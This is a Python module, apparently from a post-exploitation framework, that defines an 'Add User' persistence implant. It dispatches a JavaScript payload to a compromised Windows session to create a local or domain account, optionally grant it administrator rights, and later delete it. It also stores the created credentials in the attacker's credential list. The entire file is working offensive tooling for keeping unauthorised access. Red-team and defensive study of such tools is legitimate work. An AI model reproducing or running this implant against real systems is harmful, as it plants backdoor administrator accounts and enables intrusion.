import core.job
import core.implant
import uuid

class AddUserJob(core.job.Job):
    def create(self):
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))
        if self.session_id == -1:
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
            return False

    def report(self, handler, data, sanitize = False):
        task =  handler.get_header("Task", False)
        data = data.decode()

        if task == "CreateUser":
            handler.reply(200)
            if "The command completed successfully." in data:
                self.shell.print_good("User '%s' was created." % self.options.get("USERNAME"))
            elif "The account already exists." in data:
                self.shell.print_warning("User '%s' already exists." % self.options.get("USERNAME"))
            else:
                self.shell.print_error("User '%s' could not be created:\n%s" % (self.options.get("USERNAME"), data))
            return

        if task == "MakeAdmin":
            handler.reply(200)
            if "The command completed successfully." in data:
                self.shell.print_good("User '%s' was added as an administrator." % self.options.get("USERNAME"))
            elif "The specified account name is already a member of the group." in data:
                self.shell.print_warning("User '%s' is already an administrator." % self.options.get("USERNAME"))
            else:
                self.shell.print_error("User '%s' could not be added as an administrator:\n%s" % (self.options.get("USERNAME"), data))
            return

        if task == "DeleteUser":
            handler.reply(200)
            if "The command completed successfully." in data:
                self.shell.print_good("User '%s' was deleted." % self.options.get("USERNAME"))
            elif "The user name could not be found." in data:
                self.shell.print_warning("User '%s' does not exist." % self.options.get("USERNAME"))
            else:
                self.shell.print_error("User '%s' could not be deleted or does not exist:\n%s" % (self.options.get("USERNAME"), data))
            return

        if data == "Complete":
            super(AddUserJob, self).report(handler, data)
            
        handler.reply(200)

    def done(self):
        self.results = "User: %s , Password: %s" % (self.options.get("USERNAME"), self.options.get("PASSWORD"))
        c = {}
        c["Username"] = self.options.get("USERNAME")
        if self.options.get("DOMAIN") == "true":
            c["Domain"] = self.session.domain
        else:
            c["Domain"] = self.session.computer
        c["Password"] = self.options.get("PASSWORD")
        c["NTLM"] = ""
        c["LM"] = ""
        c["SHA1"] = ""
        c["DCC"] = ""
        c["DPAPI"] = ""
        c["IP"] = self.session.ip
        c["Extra"] = {}
        c["Extra"]["IP"] = []
        c["Extra"]["Password"] = []
        c["Extra"]["NTLM"] = []
        c["Extra"]["SHA1"] = []
        c["Extra"]["DCC"] = []
        c["Extra"]["DPAPI"] = []
        c["Extra"]["LM"] = []
        c_key = (c["Domain"].lower(), c["Username"].lower())
        if c_key not in self.shell.creds_keys:
            self.shell.creds_keys.append(c_key)
        self.shell.creds[c_key] = c
        self.display()

    def display(self):
        pass

class AddUserImplant(core.implant.Implant):

    NAME = "Add User"
    DESCRIPTION = "Adds a either a local or domain user."
    AUTHORS = ["TheNaterz"]
    STATE = "implant/persist/add_user"

    def load(self):
        self.options.register("USERNAME", "", "username to add")
        self.options.register("PASSWORD", "", "password for user")
        self.options.register("ADMIN", "false", "should this be an administrator?", enum=["true", "false"])
        self.options.register("DOMAIN", "false", "should this be a domain account? (requires domain admin)", enum=["true", "false"])
        self.options.register("CLEANUP", "false", "will remove the created user", enum=["true", "false"])
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)

    def job(self):
        return AddUserJob

    def run(self):
        if not self.options.get("USERNAME"):
            self.shell.print_error("USERNAME is a required option.")
            return
        if not self.options.get("PASSWORD"):
            self.shell.print_error("PASSWORD is a required option.")
            return

        payloads = {}
        payloads["js"] = "data/implant/persist/add_user.js"

        self.dispatch(payloads, self.job)
